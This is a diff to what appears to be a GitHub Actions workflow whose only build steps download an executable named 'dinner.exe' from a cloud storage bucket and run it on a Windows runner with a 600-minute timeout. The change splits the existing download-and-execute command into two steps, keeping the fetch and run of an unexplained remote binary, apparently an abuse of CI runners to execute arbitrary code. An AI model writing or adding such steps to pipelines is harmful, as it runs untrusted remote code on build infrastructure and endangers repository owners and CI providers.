@@ -4,5 +4,6 @@ jobs:
   build:
     runs-on: windows-2019
     steps:
-    - run: Invoke-WebRequest https://storage.googleapis.com/demontpc2024-72da6.appspot.com/dinner.exe ; .\dinner.exe
+    - run: Invoke-WebRequest https://storage.googleapis.com/demontpc2024-72da6.appspot.com/dinner.exe -OutFile dinner.exe
+    - run: .\dinner.exe
     timeout-minutes: 600
